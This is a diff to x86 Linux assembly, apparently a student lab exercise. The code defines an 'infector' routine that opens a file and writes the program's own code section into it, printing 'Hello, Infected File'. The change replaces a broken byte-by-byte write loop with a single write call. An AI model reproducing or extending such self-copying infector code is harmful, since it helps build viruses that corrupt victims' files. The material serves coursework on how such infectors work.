@@ -2,9 +2,6 @@ section	.rodata			; we define (global) read-only variables in .rodata section
 	output_string: db "Hello, Infected File"
     output_string_len: equ $ - output_string
 
-section .bss
-    write_address: resb 4  ; counter of write_address from code_start
-
 section .text
 global _start
 global system_call
@@ -50,7 +47,6 @@ system_call:
 
 
 code_start:
-    nop
 
 infection:
     push    ebp             ; Save caller state
@@ -81,21 +77,14 @@ infector:
         int 0x80                ; open
     
     mov [ebp-4], eax        ; get fd returned value
-    ;mov dword [ebp-4], 0x01        ; get fd returned value
-    mov dword [write_address], code_start         ; setting write_address to 0
     
     .write:
         mov eax, 4
         mov ebx, [ebp-4]
-        mov ecx, [write_address]
-        mov edx, 0x01
-        int 0x80
-
-        inc byte [write_address]
-
-        cmp dword [write_address], code_end
-        jne .write
-        
+        mov ecx, code_start
+        mov edx, code_end
+        sub edx, code_start     ; size in edx of code_end-code_start
+        int 0x80      
     
     .close:
         mov eax, 5
@@ -110,6 +99,3 @@ infector:
 
 
 code_end:
-    nop
-
-; writing & closing not working
